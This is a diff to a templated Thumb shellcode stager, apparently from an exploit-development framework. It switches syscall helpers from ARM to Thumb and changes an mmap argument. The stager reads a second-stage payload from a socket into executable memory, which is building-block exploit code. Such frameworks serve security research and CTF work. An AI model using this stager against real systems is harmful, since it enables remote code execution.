@@ -15,7 +15,7 @@ ${stager}:
     /* Save socket */
     ${thumb.mov('r6', sock)}
 
-    ${arm.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANONYMOUS | MAP_PRIVATE', -1, 0)}
+    ${thumb.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANONYMOUS | MAP_PRIVATE', 0xffffffff, 0)}
 
     /* Save allocated memory address */
     ${thumb.mov('r8', 'r0')}
@@ -24,7 +24,7 @@ ${stager}:
     /* Initialize read loop counter */
     ${thumb.mov('r5', size)}
 ${looplabel}:
-    ${arm.syscall('SYS_read', 'r6', 'r1', 'r5')}
+    ${thumb.syscall('SYS_read', 'r6', 'r1', 'r5')}
 
     /* Update remaining count and write-address */
     add r1, r1, r0
